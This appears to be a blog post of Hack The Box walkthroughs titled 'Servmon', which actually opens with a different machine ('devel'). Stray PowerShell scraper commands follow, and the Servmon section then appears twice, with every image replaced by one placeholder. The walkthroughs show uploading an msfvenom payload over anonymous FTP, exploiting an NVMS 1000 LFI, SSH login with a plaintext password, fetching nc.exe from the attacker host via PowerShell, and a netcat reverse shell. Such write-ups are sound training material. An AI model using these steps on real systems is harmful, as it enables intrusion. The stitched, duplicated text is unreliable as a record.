---

title: "Servmon HTB"
date: 2024-08-07 20:17:41 +0800
categories: [Servmon, Medium]
tags: [Servmon, Easy-Level, Windows, HTB Walkthrough]

---


Quote: When you find a good move, Find a better one.
Hello Folks,
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
This is my first write-up on the medium. Very recently I’ve been preparing for the PNPT Certification, After completing the PEH Course(1 of 5 off the PNPT Bundle). I am exploring the Windows Privilege Escalation Course for beginners Where Heath Adams has made in-detail videos while practically exploring Subscriptions of HTB. Considering they are the cheapest. I am Planning to Work on OSCP next. And I heard HTB labs were practically real-world hacking.
So, I thought Why not give it a shot (I have never been on the VIP side on HTB) and also share my experience of practicing rooms and boxes? Which may help newcomers like me. What I am gonna do differently than other write-ups?
At the end of every machine I get to crack, I will be posting Hacker’s Understanding Mind Map(Why they are doing what they are doing). Which is a great resource for any beginner who wants to build the methodology. So, they won’t get lost in finding endless next steps? Trying a Hundred things on the internet.
Note: Any additional ideas/thought processes are highlighted with ** **.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Right After Connecting to the HTB VPN, Routine of any other machine:
Reconnaissance:
> nmap -A -T4 -p- 10.10.10.5
Normally, you could a -sC (performing Default scripts), or -sV(OS Detection) for more information on this.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Now There are 2 takeaways here,
we have some leads to investigate & get back to recon if needed.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
why not try an FTP connection?
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
**I tried directory brute-forcing at http://10.10.10.5 with dir buster and its default 2–3 medium wordlist. But as it doesn’t seem to be a big server, There are not any interesting results found.**
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
**As the website runs on a Windows IIS7 server, I wanted to understand the technologies behind the website. So, I’m running a Nikto scan which shows the server is using .apsx files for its web framework. (N)**
we have the website And we can see the files we can access through ftp are the ones the web server is hosting. Then, simply upload a custom-created payload using msfvenom.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Now, we have our shell in the server. we can successfully run our exploit on the browser triggering it. For that, all we need to do is search for the file in the web browser while listening for any incoming connections using Metasploit’s very known module post/multi/handler.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
And Tada!! we got our first shell on the machine✨🎇.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Now, As we got some foothold on the machine.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
While browsing through the files on the system. There is the Administrator & babis Folder. Which might give us the user and root flag we are looking for. But the Access is denied.
Based on the HTB’s Guideline we can get to know there is a metasploit module that is good at suggesting exploits for privilege escalation(Similar to the Winpeas Tool). i.e.; multi/recon/local_exploit_suggester.
So running this module can guide to us some possibilities:
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Results:
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Now there is a whole list of successful exploits displayed here. So, trying them one by one is the optimal way to find the one which works for us.
Crossing the fingers: I got a session here…
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
And, we got in!!
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Browsing for flags:
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Getting flags is equal to compromising the machine.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
I will continue to post more on these Thought process takeaways, As I crack more machines. Thumbs up If you like these and follow me for more.


PS C:\Users\Eshwa> C:/Users/Eshwa/AppData/Local/Microsoft/WindowsApps/python3.10.exe C:\Users\Eshwa\scrape-medium.py
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*Iz1Wlacvl_RhOJfLZLTWxQ.png]
Un-Important Intro:
Now now, Earlier with my first write up. I’ve written a walkthrough on the Retired machine “devel”. I have talked about how anonymous FTP login had been helpful with uploading the msfvenom crafted payload into web IIS. we have privilege escalation.
This walkthrough can be a follow-up for those willing to learn Windows privilege escalation. Feel free to check the “devel” walkthrough here.
Recon results:
Nmap scan: anonymous FTP login, open SSH logins, and there is an http web server running which is NVMS 1000 web server.
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*I32Ik5tLAIiGi-4MZnGM-Q.png]
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*tMqLl69A-0Wj-Q4N0fYAbg.png]
Enumeration Begin:
//80 HTTP — web server — { Hosting NVMS — 1000 (Network Surveillance Management Software) instance) Which is found vulnerable to LFI.}
You can normally search for this vulnerability to confirm through searchsploit nvms 1000 (or) download the payload from exploit db.
From Recon.
//21 - FTP login
A cool one-liner hack I have found online to grab files from an anonymous FTP login wget -r ftp://anonymous:@10.10.10.184
If we search for NVMS vulnerabilities through searchsploit or metasploit we can find there is a LFI Vulnerability on this machine.
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*Zi6VTnC3OxbDw3UdY4403A.png]
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*yOr4qCrVFfdzpKf8YvjjMQ.png]
Overall Information we got.
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*ya2NkDyaSttiEZBjsO_05w.png]
Using this information. as we know users: Nathan & Nadine / Passwords with these possibilities, we can try either smb_login Metasploit or the crackmapexec.
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*hL2JCiQmODwPQk8Ginw0Qw.png]
Now, there is a successful login. let’s try it out.
Unluckily smb login doesn’t work. So, I tried ssh_login with same credentials.
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*hU29UJHX94Ux6xz5KPqdNg.png]
And Tada!! we got the user flag.
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*l7uURxQj7oUM_slq6ZLzkg.png]
If we try to access the Administrator account. Understand this is not the end.
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*nSw-_MeL8HrXdGg8T7mENw.gif]
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*w0BecdMnX8pc0TOcvMyerQ.png]
This can be really confusing, I kindly request go along with implementing the process to get a complete understanding of what’s happened.
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*31n9KJ_xeXXVEyqSyPI_aQ.gif]
Background Concept SSH Tunneling:
For the base theory refer to this YouTube video. which I found helpful for understanding why ssh tunnel is used. To understand how we can use this method for our example refer to the following image.
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*7pe1D-9ICdzeLk5qLNIx3A.png]
Fast forward to this,
sshpass -p “L1k3B1gBut7s@W0rk” -L 8443: localhost:8443 ssh [email protected]
Started a Python server for file transfer between linux and Windows.
Linux: python3 -m http.server -b
Windows: powershell -c (New-Object Net.WebClient).DownloadFile(‘http://10.10.14.77:8000/nc.exe','nc.e
xe’)
you can easily spot the nc.exe file in /usr/share/seclists/Web-Shells/FuzzDB if you’re using kali linux.
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*txbw-Q3T9rK2Njau5stHPA.png]
There now as we got netcat listener on the victim. We just have to ring a bell to it.
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*dugDx9tDlq_dvEBudb5sWQ.png]
2. There is our shell on the machine, now we need to
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*fqoIXWWYTq004U1RTv1l5Q.png]
3. run a Netcat listener on our attacking machine.
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*bSa8Kp_fYGEXSyLvijlcFQ.png]
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*I0aNyKP68107LZXM9tKA9w.png]
Hell, yeah we got the root flag. The machine is Pwned!!
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*pPAq7i_wySskqc_85zB54Q.png]
Easy right??
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*cTRJNM4ehX9Gf3QK8Heijg.gif]
In-Summary:
Upon getting Nmap scan results from the servmon.
Mind Map:
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*zikNtK4rF-p8QkixZMucMg.png]
[Image: https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*8jcIGXJen_E0GY5W23sQFA.png]
Appreciate If you like my approach, Follow for more.
PS C:\Users\Eshwa> C:/Users/Eshwa/AppData/Local/Microsoft/WindowsApps/python3.10.exe C:\Users\Eshwa\image_replace.py


![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Un-Important Intro:
Now now, Earlier with my first write up. I’ve written a walkthrough on the Retired machine “devel”. I have talked about how anonymous FTP login had been helpful with uploading the msfvenom crafted payload into web IIS. we have privilege escalation.
This walkthrough can be a follow-up for those willing to learn Windows privilege escalation. Feel free to check the “devel” walkthrough here.
Recon results:
Nmap scan: anonymous FTP login, open SSH logins, and there is an http web server running which is NVMS 1000 web server.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Enumeration Begin:
//80 HTTP — web server — { Hosting NVMS — 1000 (Network Surveillance Management Software) instance) Which is found vulnerable to LFI.}
You can normally search for this vulnerability to confirm through searchsploit nvms 1000 (or) download the payload from exploit db.
From Recon.
//21 - FTP login
A cool one-liner hack I have found online to grab files from an anonymous FTP login wget -r ftp://anonymous:@10.10.10.184
If we search for NVMS vulnerabilities through searchsploit or metasploit we can find there is a LFI Vulnerability on this machine.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Overall Information we got.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Using this information. as we know users: Nathan & Nadine / Passwords with these possibilities, we can try either smb_login Metasploit or the crackmapexec.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Now, there is a successful login. let’s try it out.
Unluckily smb login doesn’t work. So, I tried ssh_login with same credentials.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
And Tada!! we got the user flag.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
If we try to access the Administrator account. Understand this is not the end.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
This can be really confusing, I kindly request go along with implementing the process to get a complete understanding of what’s happened.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Background Concept SSH Tunneling:
For the base theory refer to this YouTube video. which I found helpful for understanding why ssh tunnel is used. To understand how we can use this method for our example refer to the following image.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Fast forward to this,
sshpass -p “L1k3B1gBut7s@W0rk” -L 8443: localhost:8443 ssh [email protected]
Started a Python server for file transfer between linux and Windows.
Linux: python3 -m http.server -b
Windows: powershell -c (New-Object Net.WebClient).DownloadFile(‘http://10.10.14.77:8000/nc.exe','nc.e
xe’)
you can easily spot the nc.exe file in /usr/share/seclists/Web-Shells/FuzzDB if you’re using kali linux.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
There now as we got netcat listener on the victim. We just have to ring a bell to it.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
2. There is our shell on the machine, now we need to
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
3. run a Netcat listener on our attacking machine.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Hell, yeah we got the root flag. The machine is Pwned!!
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Easy right??
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
In-Summary:
Upon getting Nmap scan results from the servmon.
Mind Map:
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Appreciate If you like my approach, Follow for more.
